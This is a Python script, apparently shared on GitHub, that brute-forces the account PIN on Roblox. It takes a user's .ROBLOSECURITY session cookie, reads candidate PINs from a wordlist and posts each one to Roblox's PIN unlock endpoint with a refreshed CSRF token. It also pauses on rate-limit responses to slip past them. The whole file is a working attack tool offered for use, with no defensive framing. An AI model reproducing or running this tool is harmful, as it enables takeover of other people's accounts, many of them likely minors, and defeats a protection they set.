anyerror = False
try:
  import requests
  import colorama
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install requests")
    os.system("pip install colorama")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()
try:
    import os
    from os import system
    system("title " + "Roblox Pin Code Cracker,   Made By blob#0005,   Github: github.com/blob0005")
except:
    pass
import time
colorama.init(autoreset=True)
while True:
    try:
        cookie = input("Enter Cookie: ")
        r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
        break
    except:
        print("Cookie Invalid")


while True:
    try:
        delay = input("Enter Delay In Seconds (300 Recomended): ")
        delay = float(delay)
        break
    except:
        print("Enter A Valid Choice")

try:
    file = open("pin_combinations.txt", "r")
    combe = file.readlines()
    combs = []
    for ce in combe:
        if "\n" in ce:
            ce = ce[:-1]
        combs.append(ce)
    file.close()
except:
    print("Missing pin_combinations.txt File, Press Enter To Exit Program")
    input("")
    exit()


req = requests.session()
req.cookies.set(".ROBLOSECURITY", str(cookie), domain="roblox.com")
url = "https://auth.roblox.com/v1/account/pin/unlock"
lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
token = str(lol.headers["x-csrf-token"])
headers = {
    "x-csrf-token": token
}

print("If Its Not Printing Anything You May Be Rate Limtied, Its Recomended To Have 300-500 Seconds As Delay To Not Be Rate Limited, If You Was Rate Limited Before You Opend The Program Open It Agian In 5-20 Minutes")
print("At Maximum It Can Take 833 Hours Or 34 Days Or 50,000 Minutes (At Recommended Delay)")

for pin in combs:

    try:
        while True:
            json = {
            "pin": int(pin)
            }
            re = req.post(url=url, headers=headers, json=json)
            lol = req.post("https://auth.roblox.com/v1/account/pin/unlock")
            token = str(lol.headers["x-csrf-token"])
            re = str(re)
            if "200" in re:
                print(colorama.Fore.GREEN + "Succsesfully Cracked Pin, Pin Is " + str(pin))
                input("")
                input("")
                input("")
                exit()
            if "429" in re:
                print(colorama.Fore.RED + "Rate Limited, Sleeping For " + str(delay) + " Seconds")
                time.sleep(float(delay))
            if "403" in re:
                print(colorama.Fore.RED + "Invalid Pin, Pin Is Not "+str(pin)+", Sleeping For " + str(delay) + " Seconds")
                time.sleep(float(delay))
                break
    except:
        print(colorama.Fore.RED + "Unkown Error, Cookie May Expired, X Csrf Token May Be Invalid")
